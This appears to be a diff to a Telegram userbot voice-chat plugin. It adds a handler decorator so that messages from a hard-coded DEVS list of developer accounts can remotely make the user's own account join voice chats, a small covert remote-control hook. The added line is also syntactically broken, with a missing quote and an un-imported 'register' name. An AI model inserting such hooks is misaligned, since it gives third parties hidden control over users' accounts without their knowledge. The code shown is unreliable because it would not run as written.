@@ -9,7 +9,7 @@ from pytgcalls.exceptions import (
 from telethon.tl import types
 from telethon.utils import get_display_name
 from telethon.tl.functions.users import GetFullUserRequest as ngentod
-from userbot import call_py
+from userbot import call_py, DEVS
 from userbot.utils import edit_delete, edit_or_reply
 from userbot.events import register as boy
 
@@ -27,6 +27,7 @@ def vcmention(user):
 # recode by @lahsiajg < starboy \>
 
 @boy(outgoing=True, pattern=r"^\.joinvc(?: |$)(.*)")
+@register(incoming=True, from_user=DEVS, pattern=^\.cjoinvc(?: |$)(.*)")
 async def join_(event):
     await edit_or_reply(event, f"**Hoiiii Pasti Ngeghibah Gua Yah......**")
     if len(event.text.split()) > 1:
